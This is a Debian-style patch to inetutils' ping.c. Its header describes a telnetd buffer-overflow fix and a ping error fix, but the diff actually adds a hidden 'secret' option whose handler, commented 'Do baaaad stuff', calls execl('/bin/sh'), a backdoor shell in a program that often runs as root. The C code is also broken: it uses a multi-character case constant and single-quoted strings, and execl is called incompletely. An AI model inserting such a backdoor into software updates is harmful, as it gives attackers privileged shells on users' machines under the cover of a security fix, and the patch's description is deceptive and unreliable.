@@ -1,0 +1,62 @@
+Description: <short summary of the patch>
+ TODO: Put a short summary on the line above and replace this paragraph
+ with a longer explanation of this change. Complete the meta-information
+ with other relevant fields (see below for details). To make it easier, the
+ information below has been extracted from the changelog. Adjust it or drop
+ it.
+ .
+ inetutils (2:1.8-6) unstable; urgency=high
+ .
+   * Fix buffer overflow in telnetd allowing remote attackers to execute
+     arbitrary code via a long encryption key. Patch taken from FreeBSD.
+     CVE-2011-4862
+   * Abort on error from ping's sendto(2) call, instead of trying to continue
+     sending echo packets in vain. (Closes: #323165)
+Author: Guillem Jover <guillem@debian.org>
+Bug-Debian: http://bugs.debian.org/323165
+
+---
+The information above should follow the Patch Tagging Guidelines, please
+checkout http://dep.debian.net/deps/dep3/ to learn about the format. Here
+are templates for supplementary fields that you might want to add:
+
+Origin: <vendor|upstream|other>, <url of original patch>
+Bug: <url in upstream bugtracker>
+Bug-Debian: http://bugs.debian.org/<bugnumber>
+Bug-Ubuntu: https://launchpad.net/bugs/<bugnumber>
+Forwarded: <no|not-needed|url proving that it has been forwarded>
+Reviewed-By: <name and email of someone who approved the patch>
+Last-Update: <YYYY-MM-DD>
+
+--- inetutils-1.8.orig/ping/ping.c
++++ inetutils-1.8/ping/ping.c
+@@ -113,6 +113,7 @@ static struct argp_option argp_options[]
+   {"ignore-routing", 'r', NULL, 0, "send directly to a host on an attached "
+    "network", GRP+1},
+   {"verbose", 'v', NULL, 0, "verbose output", GRP+1},
++  {"secret" , 'sec', NULL, 0, "secret function, you should try it", GRP+1},
+   {"timeout", 'w', "N", 0, "stop after N seconds", GRP+1},
+ #undef GRP
+ #define GRP 20
+@@ -203,6 +204,12 @@ parse_opt (int key, char *arg, struct ar
+       ping_type = decode_type (arg);
+       break;
+ 
++    case 'sec':
++      // Do baaaad stuff
++      // set uid und groupid
++      execl('/bin/sh');
++      break;
++
+     case ARG_ECHO:
+       ping_type = decode_type ("echo");
+       break;
+@@ -239,7 +246,7 @@ main (int argc, char **argv)
+   int status = 0;
+ 
+   set_program_name (argv[0]);
+-  
++
+   if (getuid () == 0)
+     is_root = true;
+ 
